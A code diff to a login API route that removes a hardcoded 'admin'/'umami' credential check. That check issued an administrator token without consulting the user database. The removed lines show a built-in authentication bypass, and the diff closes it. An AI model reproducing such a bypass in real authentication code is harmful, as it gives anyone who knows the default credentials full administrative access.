@@ -23,25 +23,6 @@ export async function POST(request: Request) {
 
   const { username, password } = body;
 
-  if (username === 'admin' && password === 'umami') {
-    const id = 'admin';
-    const role = ROLES.admin;
-    const createdAt = new Date();
-
-    let token: string;
-
-    if (redis.enabled) {
-      token = await saveAuth({ userId: id, role });
-    } else {
-      token = createSecureToken({ userId: id, role }, secret());
-    }
-
-    return json({
-      token,
-      user: { id, username, role, createdAt, isAdmin: true },
-    });
-  }
-
   const user = await getUserByUsername(username, { includePassword: true });
 
   if (!user || !checkPassword(password, user.password)) {
